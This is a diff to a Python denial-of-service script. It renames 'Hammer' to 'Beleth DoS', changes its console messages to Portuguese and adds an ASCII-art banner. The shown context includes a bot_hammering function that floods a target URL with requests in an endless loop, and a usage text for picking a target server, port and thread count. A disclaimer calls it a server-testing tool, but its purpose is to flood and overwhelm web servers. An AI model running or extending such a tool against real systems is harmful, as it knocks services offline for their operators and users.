@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[31m o bot está martelando...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -75,10 +75,24 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
+        print (''' \033[31m .__....._             _.....__,
+            .": o :':         ;': o :".
+            `. `-' .'.       .'. `-' .'
+              `---'             `---'
+
+    _...----...      ...   ...      ...----..._
+ .-'__..-""'----    `.  `"`  .'    ----'""-..__`-.
+'.-'   _.--"""'       `-._.-'       '"""--._   `-.`
+'  .-"'                  :                  `"-.  `
+  '   `.              _.'"'._              .'   `
+        `.       ,.-'"       "'-.,       .'
+          `.                           .'
+            `-._                   _.-'
+                `"'--...___...--'"` \033[0m''')
+	print (''' \033[31m	Beleth DoS alpha 0.1 
+	É responsabilidade do usuário respeitar as leis.
+	Lembre- seu IP é visível. \n
+	usage : python3 beleth.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
 	-p : port default 80
